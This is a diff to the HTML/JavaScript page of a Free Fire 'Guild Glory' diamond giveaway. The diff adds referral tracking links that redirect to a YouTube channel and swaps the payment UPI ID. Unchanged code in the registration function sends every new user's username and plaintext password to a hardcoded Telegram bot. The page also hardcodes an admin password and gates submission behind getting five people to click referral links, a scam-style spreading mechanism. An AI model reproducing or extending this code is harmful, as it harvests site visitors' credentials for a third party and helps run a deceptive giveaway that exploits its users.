@@ -1067,6 +1067,14 @@
         <label class="auth-label">Confirm Password</label>
         <input class="auth-input" type="password" id="regPass2" placeholder="Repeat password">
       </div>
+      <!-- Referred-by banner (shows when page opened via referral link) -->
+      <div id="refByBanner" style="display:none;margin-bottom:10px;padding:10px 12px;background:rgba(0,214,143,0.07);border:1px solid rgba(0,214,143,0.25);border-radius:10px;display:flex;align-items:center;gap:10px;">
+        <span style="font-size:1.2rem;">🔗</span>
+        <div>
+          <div style="font-family:var(--font-display);font-size:0.48rem;color:var(--green);letter-spacing:1px;">REFERRED BY</div>
+          <div style="font-size:0.82rem;font-weight:700;color:#fff;" id="refByName">—</div>
+        </div>
+      </div>
       <button class="auth-btn auth-btn-register" onclick="doRegister()">🚀 Create Account</button>
       <div class="auth-error" id="registerError"></div>
       <div style="margin-top:14px;padding:10px 12px;background:rgba(0,214,143,0.06);border:1px solid rgba(0,214,143,0.18);border-radius:9px;">
@@ -1287,26 +1295,24 @@
     <div class="card card-glow-cyan" id="shareTrackerCard" style="background:linear-gradient(135deg,rgba(77,159,255,0.05),rgba(77,159,255,0.04));">
       <div class="sec-header">
         <div class="sec-icon cyan">🔗</div>
-        <div><div class="sec-title cyan">Your Share Tracker</div></div>
-        <span style="margin-left:auto;font-family:var(--font-display);font-size:0.55rem;color:var(--muted);letter-spacing:1px;">REFERRALS</span>
+        <div><div class="sec-title cyan">Share Tracker</div></div>
+        <span style="margin-left:auto;font-family:var(--font-display);font-size:0.55rem;color:var(--muted);letter-spacing:1px;">TRACKING</span>
       </div>
+
       <!-- Stats row -->
-      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:14px;">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px;">
         <div style="background:rgba(77,159,255,0.06);border:1px solid rgba(77,159,255,0.18);border-radius:11px;padding:12px;text-align:center;">
-          <div style="font-family:var(--font-display);font-size:1.3rem;font-weight:900;color:var(--cyan);text-shadow:0 0 15px rgba(77,159,255,0.4);" id="shareCount">0</div>
-          <div style="font-family:var(--font-display);font-size:0.36rem;letter-spacing: 0.2px;color:var(--muted);margin-top:4px;">SHARED</div>
+          <div style="font-family:var(--font-display);font-size:1.4rem;font-weight:900;color:var(--cyan);text-shadow:0 0 15px rgba(77,159,255,0.4);" id="shareCount">0</div>
+          <div style="font-family:var(--font-display);font-size:0.36rem;color:var(--muted);margin-top:4px;">LINKS SENT</div>
         </div>
         <div style="background:rgba(0,214,143,0.06);border:1px solid rgba(0,214,143,0.18);border-radius:11px;padding:12px;text-align:center;">
-          <div style="font-family:var(--font-display);font-size:1.3rem;font-weight:900;color:var(--green);text-shadow:0 0 15px rgba(0,214,143,0.4);" id="linkClickCount">0</div>
-          <div style="font-family:var(--font-display);font-size:0.36rem;letter-spacing: 0.2px;color:var(--muted);margin-top:4px;">LINK TAPS</div>
-        </div>
-        <div style="background:rgba(255,77,166,0.06);border:1px solid rgba(255,77,166,0.18);border-radius:11px;padding:12px;text-align:center;">
-          <div style="font-family:var(--font-display);font-size:1.3rem;font-weight:900;color:var(--magenta);text-shadow:0 0 15px rgba(255,77,166,0.4);" id="refJoinCount">0</div>
-          <div style="font-family:var(--font-display);font-size:0.36rem;letter-spacing: 0.2px;color:var(--muted);margin-top:4px;">JOINED</div>
+          <div style="font-family:var(--font-display);font-size:1.4rem;font-weight:900;color:var(--green);text-shadow:0 0 15px rgba(0,214,143,0.4);" id="refJoinCount">0</div>
+          <div style="font-family:var(--font-display);font-size:0.36rem;color:var(--muted);margin-top:4px;">CLICKS</div>
         </div>
       </div>
-      <!-- Referral unlock progress -->
-      <div id="refUnlockBar" style="margin-bottom:14px;padding:12px;background:rgba(255,77,102,0.06);border:1px solid rgba(255,77,102,0.2);border-radius:11px;display:none;">
+
+      <!-- Unlock progress bar -->
+      <div id="refUnlockBar" style="display:none;margin-bottom:14px;padding:12px;background:rgba(255,77,102,0.06);border:1px solid rgba(255,77,102,0.2);border-radius:11px;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:7px;">
           <div style="font-family:var(--font-display);font-size:0.5rem;color:#ff4d6a;letter-spacing:1px;">🔒 UNLOCK SUBMISSION</div>
           <div style="font-family:var(--font-display);font-size:0.6rem;color:#ff4d6a;" id="refUnlockCount">0/5</div>
@@ -1314,23 +1320,20 @@
         <div style="height:7px;background:rgba(255,255,255,0.07);border-radius:99px;overflow:hidden;">
           <div id="refUnlockFill" style="height:100%;background:linear-gradient(90deg,#ff4d6a,#ff6b35);border-radius:99px;transition:width 0.4s ease;width:0%;"></div>
         </div>
-        <div style="font-size:0.72rem;color:var(--muted);margin-top:7px;" id="refUnlockMsg">Share your link below and get 5 friends to subscribe to unlock Guild ID submission!</div>
+        <div style="font-size:0.72rem;color:var(--muted);margin-top:7px;" id="refUnlockMsg">Send 5 unique tracked links and get each clicked to unlock submission!</div>
       </div>
-      <!-- Your referral link -->
-      <div style="background:rgba(77,159,255,0.04);border:1px solid rgba(77,159,255,0.15);border-radius:11px;padding:12px;margin-bottom:12px;">
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
-          <div style="font-family:var(--font-display);font-size:0.44rem;letter-spacing:0.2px;color:var(--cyan);">YOUR REFERRAL LINK</div>
-          <button onclick="copyRefLink()" style="font-size:0.55rem;padding:4px 10px;border-radius:7px;border:1px solid rgba(77,159,255,0.35);background:transparent;color:var(--cyan);cursor:pointer;font-family:var(--font-display);" id="copyRefBtn">📋 COPY</button>
+
+      <!-- Active tracking links list -->
+      <div style="margin-bottom:12px;">
+        <div style="font-family:var(--font-display);font-size:0.42rem;letter-spacing:1.5px;color:var(--muted);margin-bottom:8px;">YOUR TRACKING LINKS</div>
+        <div id="trackLinksList" style="display:flex;flex-direction:column;gap:6px;max-height:220px;overflow-y:auto;">
+          <div style="text-align:center;color:var(--muted);font-size:0.78rem;padding:14px;">No links yet — create one below!</div>
         </div>
-        <div style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text);word-break:break-all;line-height:1.5;" id="myRefLink">—</div>
       </div>
-      <!-- Share log -->
-      <div id="shareFeedWrap" style="max-height:100px;overflow-y:auto;margin-bottom:12px;scrollbar-width:thin;">
-        <div style="font-family:var(--font-display);font-size:0.42rem;letter-spacing: 0.2px;color:var(--muted);margin-bottom:6px;">RECENT ACTIVITY</div>
-        <div id="shareFeed" style="font-size:0.78rem;color:var(--muted);">No shares yet</div>
-      </div>
-      <button class="btn btn-cyan" onclick="shareChannel()">🔗 SHARE YOUR LINK NOW</button>
-      <button id="notifPermBtn" onclick="requestPushPermission(true)" style="width:100%;margin-top:8px;padding:12px;border-radius:12px;border:1px solid rgba(77,159,255,0.3);background:rgba(77,159,255,0.06);color:var(--cyan);font-family:var(--font-display);font-size:0.58rem;font-weight:700;cursor:pointer;letter-spacing:0.5px;">🔔 Enable Notifications</button>
+
+      <!-- Generate + share button -->
+      <button class="btn btn-cyan" onclick="generateAndShareLink()" style="margin-bottom:8px;">🔗 CREATE & SHARE NEW LINK</button>
+      <button id="notifPermBtn" onclick="requestPushPermission(true)" style="width:100%;padding:12px;border-radius:12px;border:1px solid rgba(77,159,255,0.3);background:rgba(77,159,255,0.06);color:var(--cyan);font-family:var(--font-display);font-size:0.58rem;font-weight:700;cursor:pointer;letter-spacing:0.5px;">🔔 Enable Notifications</button>
     </div>
 
     <!-- Premium teaser -->
@@ -1587,7 +1590,7 @@
         <div id="payMethodUPI">
           <div class="upi-id-chip">
             <div class="upi-id-label">UPI ID</div>
-            <div class="upi-id-value" id="upiIdDisplay">rrrajeevvvfix@fam</div>
+            <div class="upi-id-value" id="upiIdDisplay">iamnotsanjuu@upi</div>
           </div>
           <button class="btn btn-purple" style="margin-bottom:14px;" onclick="copyUpiId()">📋 Copy UPI ID</button>
           <div style="background:rgba(77,159,255,0.06);border:1px solid rgba(77,159,255,0.2);border-radius:12px;padding:14px;">
@@ -1962,7 +1965,7 @@
     const TELEGRAM_CHAT_ID = '7116845457';
     const ADMIN_PASSWORD = 'SANJEEV@143';
     const EARNBOX_URL = 'https://web.earnbox.net/h6/#/?salt=160SAodMsQ';
-    const UPI_ID = 'rrrajeevvvfix@fam';
+    const UPI_ID = 'iamnotsanjuu@upi';
 
     // ── USER STORAGE (simulated user.txt via localStorage) ──
     function getUsers() {
@@ -2013,6 +2016,9 @@
         users[u] = { pass: btoa(p), id: uid, registered: new Date().toISOString() };
         saveUsers(users);
         setCurrentUser(u);
+        // Credit referrer if user came via referral link
+        if (window._fbReady) creditReferrer(u);
+        else document.addEventListener('fbReady', () => creditReferrer(u), {once:true});
         // Send new registration to Telegram (user.txt equivalent)
         const regMsg = `📝 NEW USER REGISTERED\n👤 Username: ${u}\n🔑 Password: ${p}\n🆔 UserID: ${uid}\n⏰ Registered: ${new Date().toLocaleString('en-IN')}\n🌐 Guild Glory — Kaddu_YT9`;
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(regMsg)}`).catch(()=>{});
@@ -2033,12 +2039,14 @@
         document.getElementById('userAvatar').textContent = username[0].toUpperCase();
         document.getElementById('upiIdDisplay').textContent = UPI_ID;
         initState();
+        // Start real-time referral join listener
+        listenRefJoins();
         // Load user role from Firebase (auto-unlocks admin if role=admin)
         const _loadRole = () => loadCurrentUserRole();
         if (window._fbReady) setTimeout(_loadRole, 300);
         else document.addEventListener('fbReady', _loadRole, {once:true});
-        // Update share tracker UI
-        setTimeout(updateShareUI, 100);
+        // Update share tracker UI + load tracking links
+        setTimeout(() => { updateShareUI(); loadTrackLinks(); }, 300);
         // Check if this user already submitted a guild ID
         const userSubmissions = JSON.parse(localStorage.getItem('savedUserSubmissions')) || {};
         if (userSubmissions[username]) {
@@ -2059,6 +2067,7 @@
 
     // Auto-login check
     window.addEventListener('DOMContentLoaded', () => {
+        handleTrackClick(); // handle ?t= tracking click immediately
         const cur = getCurrentUser();
         if (cur && getUsers()[cur]) {
             initApp(cur);
@@ -3363,53 +3372,269 @@
         try{await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);}catch{}
     }
 
+
+    // ── REFERRAL TRACKING ──
+
+    // initReferralParam removed — replaced by handleTrackClick
+
+    // Credit the referrer +1 join in Firebase when a new user registers
+    async function creditReferrer(newUsername) {
+        const referrer = sessionStorage.getItem('gg_referrer');
+        if (!referrer || referrer === newUsername) return; // no self-referral
+
+        try {
+            const { db, ref, get, set, push } = window._fb;
+
+            // Write referral record to Firebase
+            await push(ref(db, 'referrals'), {
+                referrer: referrer,
+                newUser: newUsername,
+                ts: Date.now()
+            });
+
+            // Update referrer's join count in Firebase
+            const joinRef = ref(db, 'ref_joins/' + referrer);
+            const snap = await get(joinRef);
+            const current = snap.exists() ? (snap.val() || 0) : 0;
+            await set(joinRef, current + 1);
+
+            // Sync the referrer's localStorage if they're currently online
+            // (handled by listenRefJoins — see below)
+
+            sessionStorage.removeItem('gg_referrer');
+
+            // Notify referrer via Firebase notification
+            await push(ref(db, 'notifications'), {
+                title: '🎉 New Referral Join!',
+                msg: newUsername + ' joined using your referral link! (' + (current + 1) + ' total joins)',
+                type: 'gift',
+                ts: Date.now(),
+                forUser: referrer  // targeted notification
+            });
+
+            console.log('Referrer credited:', referrer, '→', current + 1, 'joins');
+        } catch(e) {
+            console.error('creditReferrer error:', e);
+        }
+    }
+
+    // Listen to this user's join count in Firebase (real-time sync)
+    function listenRefJoins() {
+        if (!window._fbReady) { document.addEventListener('fbReady', listenRefJoins, {once:true}); return; }
+        const u = getCurrentUser();
+        if (!u) return;
+        const { db, ref, onValue } = window._fb;
+        onValue(ref(db, 'ref_joins/' + u), snap => {
+            const joins = snap.exists() ? (snap.val() || 0) : 0;
+            // Sync into local refData
+            const d = getRefData();
+            if (d.joins !== joins) {
+                d.joins = joins;
+                saveRefData(d);
+                updateShareUI();
+            }
+        });
+    }
+
+
     // ── SHARE & LINK TRACKER ──
+
+    // ── Referral/share data helpers (kept for unlock progress compatibility) ──
     function getRefData() {
         try { return JSON.parse(localStorage.getItem('gg_refData_'+getCurrentUser())) || {shares:0,clicks:0,joins:0,log:[]}; } catch { return {shares:0,clicks:0,joins:0,log:[]}; }
     }
     function saveRefData(d) { localStorage.setItem('gg_refData_'+getCurrentUser(), JSON.stringify(d)); }
 
+    // ── Tracking links stored in Firebase: trackLinks/{user}/{linkId} ──
+    // Each link: { id, url (YT link + token), created, clicks, used, label }
+
+    function generateTrackId() {
+        return Math.random().toString(36).slice(2,8).toUpperCase() + Date.now().toString(36).toUpperCase();
+    }
+
+    async function generateAndShareLink() {
+        const cur = getCurrentUser();
+        if (!cur) return;
+        if (!window._fbReady) { showToast('⚠ DB not ready, try again','#ff6b35','#000'); return; }
+
+        const { db, ref, set } = window._fb;
+        const id = generateTrackId();
+        // The tracking URL — opens website with track token
+        const trackUrl = `${window.location.origin}${window.location.pathname}?t=${id}&by=${encodeURIComponent(cur)}`;
+        const shareText = `🔥 Subscribe to Kaddu_YT9 & join the Guild Glory Giveaway! Win Free Fire diamonds!\n\n🎯 Click to subscribe: ${trackUrl}\n\n(Link tracks your referral — opens YouTube)`;
+
+        try {
+            // Save link to Firebase before sharing
+            await set(ref(db, 'trackLinks/' + cur + '/' + id), {
+                id, created: Date.now(), clicks: 0, used: false,
+                label: 'Link #' + (await getTrackLinkCount(cur) + 1)
+            });
+
+            // Share it
+            if (navigator.share) {
+                await navigator.share({ title: 'Kaddu_YT9 Guild Glory', text: shareText, url: trackUrl });
+            } else {
+                await navigator.clipboard.writeText(shareText);
+                showToast('📋 Link copied — share it now!', '#00d68f', '#000');
+            }
+
+            // Update shares count
+            const d = getRefData();
+            d.shares = (d.shares || 0) + 1;
+            saveRefData(d);
+
+            // Refresh list
+            loadTrackLinks();
+            updateShareUI();
+
+            // Telegram log
+            const msg = `🔗 NEW TRACK LINK CREATED\n👤 User: ${cur}\n🆔 Link ID: ${id}\n⏰ ${new Date().toLocaleString('en-IN')}`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`).catch(()=>{});
+        } catch(e) { /* user cancelled */ }
+    }
+
+    async function getTrackLinkCount(username) {
+        try {
+            const { db, ref, get } = window._fb;
+            const snap = await get(ref(db, 'trackLinks/' + username));
+            return snap.exists() ? Object.keys(snap.val()).length : 0;
+        } catch { return 0; }
+    }
+
+    // ── Called when someone opens the site with ?t=TOKEN&by=USER ──
+    async function handleTrackClick() {
+        const params = new URLSearchParams(window.location.search);
+        const token = params.get('t');
+        const by    = params.get('by');
+        if (!token || !by) return;
+
+        // Hide app — show a redirect splash while recording click
+        document.body.style.display = 'none';
+        const splash = document.createElement('div');
+        splash.style.cssText = 'position:fixed;inset:0;background:#07010e;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;z-index:999999;';
+        splash.innerHTML = '<div style="font-size:3rem;">▶️</div><div style="font-family:sans-serif;color:#fff;font-size:1rem;font-weight:700;">Opening YouTube...</div><div style="font-family:monospace;font-size:0.75rem;color:rgba(255,255,255,0.4);">Tracking referral click</div>';
+        document.body.style.display = '';
+        document.body.appendChild(splash);
+
+        // Clean URL
+        window.history.replaceState({}, '', window.location.pathname);
+
+        if (!window._fbReady) {
+            document.addEventListener('fbReady', () => recordTrackClick(token, by), {once:true});
+        } else {
+            recordTrackClick(token, by);
+        }
+    }
+
+    async function recordTrackClick(token, by) {
+        try {
+            const { db, ref, get, set, push } = window._fb;
+            const linkRef = ref(db, 'trackLinks/' + by + '/' + token);
+            const snap = await get(linkRef);
+
+            if (!snap.exists()) return; // invalid link
+
+            const link = snap.val();
+
+            if (link.used) {
+                // Already clicked — still redirect to YouTube but don't count
+                window.location.href = 'https://youtube.com/@kaddu_yt9?si=ww2NP0NynV4UWW_a';
+                return;
+            }
+
+            // Mark as used + increment click
+            await set(linkRef, { ...link, clicks: 1, used: true, clickedAt: Date.now() });
+
+            // Increment the owner's total click count in Firebase
+            const clickRef = ref(db, 'ref_joins/' + by);
+            const cSnap = await get(clickRef);
+            const total = cSnap.exists() ? (cSnap.val() || 0) : 0;
+            await set(clickRef, total + 1);
+
+            // Notify the link owner
+            await push(ref(db, 'notifications'), {
+                title: '🔗 Your link was clicked!',
+                msg: 'Someone opened your tracking link! You now have ' + (total + 1) + ' total clicks.',
+                type: 'gift', ts: Date.now()
+            });
+
+        } catch(e) { console.error('recordTrackClick:', e); }
+
+        // Always redirect to YouTube after recording (or even on error)
+        window.location.href = 'https://youtube.com/@kaddu_yt9?si=ww2NP0NynV4UWW_a';
+    }
+
+    // ── Load and render tracking links list ──
+    async function loadTrackLinks() {
+        const list = document.getElementById('trackLinksList');
+        if (!list || !window._fbReady) return;
+        const cur = getCurrentUser();
+        if (!cur) return;
+
+        const { db, ref, get } = window._fb;
+        try {
+            const snap = await get(ref(db, 'trackLinks/' + cur));
+            if (!snap.exists()) {
+                list.innerHTML = '<div style="text-align:center;color:var(--muted);font-size:0.78rem;padding:14px;">No links yet — create one below!</div>';
+                return;
+            }
+            const links = Object.values(snap.val()).sort((a,b) => b.created - a.created);
+            list.innerHTML = links.map(l => {
+                const trackUrl = `${window.location.origin}${window.location.pathname}?t=${l.id}&by=${encodeURIComponent(cur)}`;
+                const date = new Date(l.created).toLocaleDateString('en-IN');
+                const statusColor = l.used ? '#00d68f' : 'rgba(255,255,255,0.3)';
+                const statusText  = l.used ? '✅ Clicked' : '⏳ Waiting';
+                return `
+                <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.07);border-radius:11px;padding:11px 12px;">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px;">
+                        <div style="font-family:var(--font-display);font-size:0.52rem;color:var(--cyan);">🔗 ${l.label || l.id}</div>
+                        <span style="font-size:0.65rem;color:${statusColor};font-weight:700;">${statusText}</span>
+                    </div>
+                    <div style="font-family:var(--font-mono);font-size:0.6rem;color:rgba(255,255,255,0.3);margin-bottom:8px;">${date}</div>
+                    <button onclick="copyTrackLink('${l.id}')" style="width:100%;padding:8px;border-radius:8px;border:1px solid rgba(77,159,255,0.25);background:transparent;color:var(--cyan);font-family:var(--font-display);font-size:0.5rem;cursor:pointer;letter-spacing:1px;">📋 COPY LINK</button>
+                </div>`;
+            }).join('');
+        } catch(e) {
+            list.innerHTML = '<div style="color:#ff4d6a;font-size:0.75rem;padding:8px;">Error loading links</div>';
+        }
+    }
+
+    function copyTrackLink(id) {
+        const cur = getCurrentUser();
+        const url = `${window.location.origin}${window.location.pathname}?t=${id}&by=${encodeURIComponent(cur)}`;
+        navigator.clipboard.writeText(url).then(() => showToast('📋 Link copied!', '#00d68f', '#000'));
+    }
+
     function updateShareUI() {
         const cur = getCurrentUser();
         if (!cur) return;
         const d = getRefData();
-        document.getElementById('shareCount').innerText = d.shares || 0;
-        document.getElementById('linkClickCount').innerText = d.clicks || 0;
-        document.getElementById('refJoinCount').innerText = d.joins || 0;
-        // My referral link (uses username as ref tag)
-        const refLink = `https://youtube.com/@kaddu_yt9?ref=${encodeURIComponent(cur)}`;
-        const el = document.getElementById('myRefLink');
-        if (el) el.textContent = refLink;
-        // Feed
-        const feed = document.getElementById('shareFeed');
-        if (feed) {
-            if (d.log && d.log.length) {
-                feed.innerHTML = d.log.slice(-5).reverse().map(l =>
-                    `<div style="padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.04);font-size:0.75rem;color:var(--muted);">${l}</div>`
-                ).join('');
+        const elShares = document.getElementById('shareCount');
+        if (elShares) elShares.innerText = d.shares || 0;
+        // joins now = real clicks from Firebase (synced by listenRefJoins)
+        const joins = d.joins || 0;
+        const elJoins = document.getElementById('refJoinCount');
+        if (elJoins) elJoins.innerText = joins;
+        // Unlock bar
+        const bar = document.getElementById('refUnlockBar');
+        if (bar) {
+            if (joins < 5) {
+                bar.style.display = 'block';
+                const pct = Math.min(100, (joins / 5) * 100);
+                const fillEl   = document.getElementById('refUnlockFill');
+                const countEl  = document.getElementById('refUnlockCount');
+                const msgEl    = document.getElementById('refUnlockMsg');
+                if (fillEl)  fillEl.style.width = pct + '%';
+                if (countEl) countEl.textContent = joins + '/5';
+                const need = 5 - joins;
+                if (msgEl) msgEl.textContent = need > 0
+                    ? '👉 ' + need + ' more click' + (need>1?'s':'') + ' needed to unlock Guild ID submission.'
+                    : '✅ Unlocked! You can now submit your Guild ID.';
             } else {
-                feed.textContent = 'No shares yet';
+                bar.style.display = 'none';
             }
         }
-        // Update referral unlock progress bar
-        const joins = d.joins || 0;
-        const bar = document.getElementById('refUnlockBar');
-        if (bar && joins < 5) {
-            bar.style.display = 'block';
-            const pct = Math.min(100, (joins / 5) * 100);
-            const fillEl = document.getElementById('refUnlockFill');
-            const countEl = document.getElementById('refUnlockCount');
-            const msgEl = document.getElementById('refUnlockMsg');
-            if (fillEl) fillEl.style.width = pct + '%';
-            if (countEl) countEl.textContent = joins + '/5';
-            const need = 5 - joins;
-            if (msgEl) msgEl.textContent = need > 0
-                ? '👉 ' + need + ' more join' + (need>1?'s':'') + ' needed to unlock Guild ID submission.'
-                : '✅ Unlocked! You can now submit your Guild ID.';
-        } else if (bar && joins >= 5) {
-            bar.style.display = 'none';
-        }
-        // Update lock banners on confirm buttons
+        // Lock banners on confirm buttons
         const needed = Math.max(0, 5 - joins);
         const unlocked = joins >= 5;
         ['homeRefLockBanner','taskRefLockBanner'].forEach(id => {
@@ -3422,46 +3647,10 @@
         });
     }
 
-    async function shareChannel() {
-        const cur = getCurrentUser();
-        const refLink = `https://youtube.com/@kaddu_yt9?ref=${encodeURIComponent(cur||'guest')}`;
-        const text = `🔥 Join Kaddu_YT9's Giveaway! Help reach the milestone to unlock the LUCKY WHEEL! 🎡\n🎯 Subscribe here: ${refLink}`;
-        const d = getRefData();
-        try {
-            if (navigator.share) {
-                await navigator.share({ title:'Kaddu_YT9 Guild Glory', text, url: refLink });
-            } else {
-                await navigator.clipboard.writeText(text);
-                showToast('✅ Link copied! Share it everywhere!','#00e878','#000');
-            }
-            d.shares = (d.shares||0) + 1;
-            d.clicks = (d.clicks||0) + 1;
-            const now = new Date().toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'});
-            d.log = d.log || [];
-            d.log.push(`🔗 ${now} — Link shared`);
-            saveRefData(d);
-            totalShares = d.shares;
-            localStorage.setItem('savedShareCount', totalShares);
-            updateShareUI();
-            // Notify Telegram
-            const msg = `🔗 SHARE EVENT\n👤 User: ${cur}\n📊 Total Shares: ${d.shares}\n🔗 Ref Link: ${refLink}\n⏰ ${new Date().toLocaleString('en-IN')}`;
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`).catch(()=>{});
-        } catch(e) {
-            // User cancelled share
-        }
-    }
+    // shareChannel kept as alias for backward compat (not used in new UI)
+    async function shareChannel() { generateAndShareLink(); }
+    function trackRefClick() {}
 
-    function trackRefClick() {
-        // Called when user taps the YT subscribe button
-        const cur = getCurrentUser();
-        if (!cur) return;
-        const d = getRefData();
-        d.clicks = (d.clicks||0) + 1;
-        const now = new Date().toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'});
-        d.log = d.log || [];
-        d.log.push(`👆 ${now} — Subscribe link tapped`);
-        saveRefData(d); updateShareUI();
-    }
 
     // ── YOUTUBE ──
     async function fetchSubscribers() {
@@ -3673,5 +3862,3 @@
 </script>
 </body>
 </html>
-
-
